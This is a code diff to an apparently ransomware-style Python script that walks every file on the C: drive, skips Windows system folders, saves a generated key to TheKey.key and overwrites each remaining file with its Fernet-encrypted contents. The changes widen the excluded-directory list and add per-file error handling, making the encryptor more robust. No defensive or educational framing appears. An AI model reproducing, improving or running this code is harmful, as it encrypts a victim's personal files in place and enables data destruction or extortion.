@@ -7,7 +7,9 @@ root_dir = "C:\\"
 
 def get_all_files(root_dir):
     all_files = []
-    excluded_dir = ["System32", "Windows", "Program Files", "AppData"]
+    excluded_dir = ["System32", "Windows", "Program Files", "AppData", "ProgramData", "$Recycle.Bin", "System Volume Information",
+                    "Boot", "Fonts", "Logs", "PolicyDefinitions", "Prefetch", "System", "config", "drivers",
+                    "DriverStore", "Logfiles", "spool", "SysWOW64", "Temp", "WinSxS", "Common Files", "Default User", "Default", "Public"]
     for dirpath, dirnames, filenames in os.walk(root_dir):
         #Exclude some directories
         dirnames[:] = [d for d in dirnames if d not in excluded_dir]
@@ -27,12 +29,15 @@ key = Fernet.generate_key()
 with open("TheKey.key", "wb") as thekey:
     thekey.write(key)
 
-
+fernet = Fernet(key)
 for file in files:
-    with open(file, "rb") as theFile:
-        contentOfFiles = theFile.read()
-    #Encrypt data
-    encryptedContent = Fernet(key).encrypt(contentOfFiles)
-
-    with open(file, "wb") as theFile:
-        theFile.write(encryptedContent)
+    try:
+        with open(file, "rb") as theFile:
+            contentOfFiles = theFile.read()
+        #Encrypt data
+        encryptedContent = fernet.encrypt(contentOfFiles)
+        with open(file, "wb") as theFile:
+            theFile.write(encryptedContent)
+        print(f"Encrypted {file}")
+    except Exception as e:
+        print(f"Failed to encrypt {file}: {e}")
